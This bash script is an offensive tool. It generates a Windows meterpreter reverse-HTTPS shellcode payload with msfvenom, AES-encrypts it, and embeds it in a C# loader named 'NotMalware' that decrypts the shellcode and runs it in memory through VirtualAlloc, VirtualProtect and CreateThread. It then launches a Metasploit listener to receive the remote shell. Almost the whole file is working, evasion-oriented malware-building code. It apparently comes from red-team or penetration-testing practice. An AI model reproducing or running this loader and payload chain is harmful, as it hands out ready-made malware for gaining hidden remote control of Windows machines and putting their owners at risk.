#!/bin/bash

# Config — edit these before running
LHOST=""
LPORT=""
PAYLOAD="windows/x64/meterpreter/reverse_https"
OUTPUT_BIN="/tmp/payload.bin"
OUTPUT_B64="/tmp/payload.b64"
OUTPUT_CS="/tmp/NotMalware.cs"

# Cleanup leftovers from previous runs regardless of ownership
echo "[*] Cleaning up leftovers from previous runs..."
sudo rm -f $OUTPUT_BIN $OUTPUT_B64 $OUTPUT_CS

# Prompt if not set
if [[ -z "$LHOST" ]]; then read -p "[?] Enter LHOST: " LHOST; fi
if [[ -z "$LPORT" ]]; then read -p "[?] Enter LPORT: " LPORT; fi

# AES-128-CBC keys — random 16 bytes each run
KEY=$(openssl rand -hex 16)
IV=$(openssl rand -hex 16)

echo "[*] LHOST: $LHOST | LPORT: $LPORT"
echo "[*] Key (hex): $KEY"
echo "[*] IV  (hex): $IV"

# Generate raw shellcode
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $OUTPUT_BIN 2>/dev/null
echo "[*] Payload size: $(wc -c < $OUTPUT_BIN) bytes"

# AES-128-CBC encrypt (PKCS7 padding, no salt) then Base64
openssl enc -aes-128-cbc -nosalt -K $KEY -iv $IV -in $OUTPUT_BIN | openssl base64 -A > $OUTPUT_B64
BUFENC=$(cat $OUTPUT_B64)

# Convert hex key and IV to C# byte array format e.g. 0x1f, 0x76, ...
KEY_CS=$(echo $KEY | sed 's/../0x&, /g' | sed 's/, $//')
IV_CS=$(echo $IV | sed 's/../0x&, /g' | sed 's/, $//')

echo "[*] Generating C# source: $OUTPUT_CS"

cat > $OUTPUT_CS << 'CSEOF'
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace NotMalware
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Encrypted shellcode (AES-128-CBC + Base64)
            string bufEnc = "BUFENC_PLACEHOLDER";

            // Decrypt shellcode
            Aes aes = Aes.Create();
            byte[] key = new byte[16] { KEY_PLACEHOLDER };
            byte[] iv  = new byte[16] { IV_PLACEHOLDER };
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] buf;
            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var msPlain = new System.IO.MemoryStream())
                    {
                        csDecrypt.CopyTo(msPlain);
                        buf = msPlain.ToArray();
                    }
                }
            }

            // Allocate RW space for shellcode
            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            UInt32 lpflOldProtect;
            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

            // Execute the shellcode in a new thread
            UInt32 lpThreadId = 0;
            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}
CSEOF

# Inject generated values into placeholders
sed -i "s|BUFENC_PLACEHOLDER|$BUFENC|g" $OUTPUT_CS
sed -i "s|KEY_PLACEHOLDER|$KEY_CS|g" $OUTPUT_CS
sed -i "s|IV_PLACEHOLDER|$IV_CS|g" $OUTPUT_CS

echo "[*] Done. C# source saved to: $OUTPUT_CS"
echo "[*] Transfer NotMalware.cs to Windows and compile with:"
echo "    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:NotMalware.exe NotMalware.cs"
echo ""

# Launch Metasploit listener — drops into meterpreter shell immediately on connection
echo "[*] Launching Metasploit listener on 0.0.0.0:$LPORT..."
msfconsole -q -x "use multi/handler; set PAYLOAD $PAYLOAD; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession true; exploit"
